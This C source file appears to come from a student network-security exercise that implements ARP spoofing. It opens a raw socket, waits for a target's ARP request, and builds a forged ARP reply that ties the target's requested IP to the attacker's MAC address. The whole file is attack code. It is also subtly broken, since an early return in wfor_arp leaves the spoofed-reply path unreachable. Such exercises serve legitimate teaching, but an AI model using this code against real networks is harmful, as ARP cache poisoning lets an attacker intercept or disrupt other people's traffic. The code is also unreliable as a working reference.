/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   packet.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ltrillar <ltrillar@student.42luxembou      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/07/28 16:13:44 by ltrillar          #+#    #+#             */
/*   Updated: 2026/07/28 23:58:45 by ltrillar         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/malcolm.h"

int
crt_sock(t_malcolm *m) {
	int fd = ERR;
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
		return (ERR);

	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, m->itrf, s_len(m->itrf)) == -1)
			return (ERR);
	return (fd);
}

int
wfor_arp(t_malcolm *m, t_arp_hdr *arp) {
	uint8_t pkt[ARP_PKT];
	struct sockaddr_ll from;
	zro_mem(&from, sizeof(from));
	socklen_t lenfrom = sizeof(from);
	ssize_t r = recvfrom(m->fd, pkt, sizeof(pkt), 0, (struct sockaddr*)&from, &lenfrom);
	if (r < 0)
		return (-1);
	t_ether_hdr *eth = (t_ether_hdr *)pkt;
	arp = (t_arp_hdr*)(pkt + sizeof(t_ether_hdr));
	if (ntohs(arp->op) == ARPOP_REQUEST && ntohs(eth->type) == ETH_P_ARP) {
		if (cmp_mem(arp->spa, &m->trg_ip, IPV4_L) != GOOD)
			return (1);
		if (cmp_mem(arp->sha, &m->trg_mac, MAC_L) != GOOD)
			return (1);
		if (cmp_mem(arp->tpa, &m->src_ip, IPV4_L) != GOOD)
			return (1);
		printf("[🏷️ ]: An ARP request has been broadcast.\n"
			"	MAC address of request: %02x:%02x:%02x:%02x:%02x:%02x\n"
			"	IP address of request: %hhu.%hhu.%hhu.%hhu\n",
				arp->sha[0], arp->sha[1], arp->sha[2], 
				arp->sha[3], arp->sha[4], arp->sha[5],
				arp->spa[0], arp->spa[1], arp->spa[2],
				arp->spa[3]);
		return (0);
		printf("Now sending an ARP reply to the target address with spoofed source, please wait..\n");
		sleep(1);
		sto_arp(m, arp);
		f_exit(GOOD, free_malcolm, m, "Sent an ARP reply packet, you may now check the arp table on the target.\nExiting program...");	
	}
	return (1);
}

static void
build_pkt(t_malcolm *m, t_arp_hdr *req_pkt, uint8_t *rep_pkt) {
	t_ether_hdr *eth = (t_ether_hdr *)rep_pkt;
	cpy_mem(eth->dmac, m->trg_mac, MAC_L);
	cpy_mem(eth->smac, m->src_mac, MAC_L);
	eth->type = htons(ETH_P_ARP);

	t_arp_hdr *arp = (t_arp_hdr*)(rep_pkt + sizeof(t_ether_hdr));
	cpy_mem(arp->sha, m->src_mac, MAC_L);
	cpy_mem(arp->spa, m->src_ip, IPV4_L);
	cpy_mem(arp->tha, req_pkt->sha, MAC_L);
	cpy_mem(arp->tpa, req_pkt->spa, IPV4_L);
	arp->op = htons(ARPOP_REPLY);
	arp->pln = IPV4_L;
	arp->hln = MAC_L;
	arp->pro = htons(0x0800);
	arp->hrd = htons(1);
}

static void
build_dst(t_malcolm* m, struct sockaddr_ll* dst, socklen_t* dstlen) {
	memset(dst, 0, sizeof(*dst));
	dst->sll_family = AF_PACKET;
	dst->sll_ifindex = if_nametoindex(m->itrf);
	if (dst->sll_ifindex == 0)
		f_exit(BAD, free_malcolm, m, strerror(errno));
	dst->sll_halen = MAC_L;
	cpy_mem(dst->sll_addr, m->trg_mac, MAC_L); 
	(*dstlen) = sizeof(*dst);
}

int sto_arp(t_malcolm *m, t_arp_hdr *old_arp) {
	uint8_t rep_pkt[ARP_PKT];
	struct sockaddr_ll dst;
	socklen_t dstlen;

	build_pkt(m, old_arp, rep_pkt);
	build_dst(m, &dst, &dstlen);

	ssize_t r = sendto(m->fd, rep_pkt, sizeof(rep_pkt), 0, (struct sockaddr*)&dst, dstlen);
	if (r < 0)
		return (-1);
	return (0);
}
